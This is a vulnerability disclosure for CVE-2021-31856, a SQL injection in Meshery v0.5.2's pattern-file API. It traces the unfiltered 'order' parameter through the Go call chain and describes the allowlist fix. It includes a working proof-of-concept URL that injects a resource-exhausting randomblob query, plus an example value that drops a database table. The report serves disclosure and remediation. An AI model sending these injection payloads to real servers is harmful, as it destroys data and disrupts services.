# [Vulnerability Report] CVE-2021-31856: a sql injection in Meshery

| item | details | note |
| --- | --- | --- |
| project | https://github.com/layer5io/meshery |
| date announced | 2021-04-28 |
| CVE-ID | CVE-2021-31856 | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-31856 |
| EDB-ID | \ |  |
| Vulnerable Version | v0.5.2 | \ |
| Patched Version | v0.5.3 | https://github.com/layer5io/meshery/pull/2745 |
| CVSS | 7.5 CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |
| Author | https://github.com/ssst0n3 | |

## 1. Description

GetMesheryPatterns() function in `meshery/models/meshery_pattern_persister.go` has SQL Injection vulnerability via the `/api/experimental/patternfile?order=id%3Bselect(randomblob(1000000000))&page=0&page_size=0` order parameter.

## 2. PoC
```!
http://<IP>:9081/api/experimental/patternfile?order=id%3Bselect(randomblob(1000000000))&page=0&page_size=0
```

[watch the video](https://drive.google.com/file/d/15yghdCP5D3Qi2RHKBpaJe72q0FtRKj5Y/view)

<video controls autoplay src="https://st0n3-img.obs.cn-south-1.myhuaweicloud.com/container/meshery/meshery_sqli_exploit.mp4" width=100%>
  <p>Your browser doesn't support HTML5 video. Here is a 
      <a href="https://st0n3-img.obs.cn-south-1.myhuaweicloud.com/container/meshery/meshery_sqli_exploit.mp4">
      link to the video</a> instead.</p>
</video>

## 3. Code Analysis

The parameter `order` in function `GetMesheryPatterns` is a instance of string. It will be appended to query statement directly when using gorm, and the sql query statement is executed by `Find()`.

https://github.com/layer5io/meshery/blob/v0.5.2/models/meshery_pattern_persister.go#L35
```!
func (mpp *MesheryPatternPersister) GetMesheryPatterns(search, order string, page, pageSize uint64) ([]byte, error) {
	if order == "" {
		order = "updated_at desc"
	}
        ...
	query := mpp.DB.Order(order)
        ...
	Paginate(uint(page), uint(pageSize))(query).Find(&patterns)
        ...
}
```

If the parameter `order` comes from the user's input without any filtering, there is a sql injection vulnerability.

Tracing the call process, we can find that the parameter "order" comes directly from the query.

https://github.com/layer5io/meshery/blob/v0.5.2/handlers/meshery_pattern_handler.go#L140

```!
func (h *Handler) GetMesheryPatternsHandler(
	rw http.ResponseWriter,
	r *http.Request,
	prefObj *models.Preference,
	user *models.User,
	provider models.Provider,
) {
	q := r.URL.Query()

	resp, err := provider.GetMesheryPatterns(r, q.Get("page"), q.Get("page_size"), q.Get("search"), q.Get("order"))
	if err != nil {
		http.Error(rw, fmt.Sprintf("failed to fetch the patterns: %s", err), http.StatusInternalServerError)
		return
	}

	rw.Header().Set("Content-Type", "application/json")
	fmt.Fprint(rw, string(resp))
}

```

If we debug, we can find that the query statement is:

```!
SELECT * FROM `meshery_patterns` ORDER BY <ORDER>
```

if we let order=`id;drop table meshery_patterns`, the statement will become

```!
SELECT * FROM `meshery_patterns` ORDER BY id;drop table meshery_patterns
```

and the table will be deleted.

---

The full call chain is:

https://github.com/layer5io/meshery/blob/v0.5.2/router/server.go#L127
```!
	gMux.Handle("/api/experimental/patternfile", h.ProviderMiddleware(h.AuthMiddleware(h.SessionInjectorMiddleware(h.PatternFileRequestHandler)))).
		Methods("POST", "GET")
```

https://github.com/layer5io/meshery/blob/v0.5.2/handlers/meshery_pattern_handler.go#L93

```
func (h *Handler) PatternFileRequestHandler(
...
		h.GetMesheryPatternsHandler(rw, r, prefObj, user, provider)
}
```

https://github.com/layer5io/meshery/blob/v0.5.2/handlers/meshery_pattern_handler.go#L149
```!
func (h *Handler) GetMesheryPatternsHandler(
...
	resp, err := provider.GetMesheryPatterns(r, q.Get("page"), q.Get("page_size"), q.Get("search"), q.Get("order"))
..
```

https://github.com/layer5io/meshery/blob/v0.5.2/models/default_local_provider.go#L439

```!
func (l *DefaultLocalProvider) GetMesheryPatterns(req *http.Request, page, pageSize, search, order string) ([]byte, error) {
...
	return l.MesheryPatternPersister.GetMesheryPatterns(search, order, pg, pgs)
}
```

https://github.com/layer5io/meshery/blob/v0.5.2/models/meshery_pattern_persister.go#L35-L44
```!
func (mpp *MesheryPatternPersister) GetMesheryPatterns(search, order string, page, pageSize uint64) ([]byte, error) {
	if order == "" {
		order = "updated_at desc"
	}
        ...
	query := mpp.DB.Order(order)
        ...
	Paginate(uint(page), uint(pageSize))(query).Find(&patterns)
        ...
}
```

## 4. Fix

Set an allowlist for the parameter order instead of using parameters from user input without any filtering.

https://github.com/layer5io/meshery/pull/2745

You can get some references from gorm's document: https://gorm.io/docs/security.html
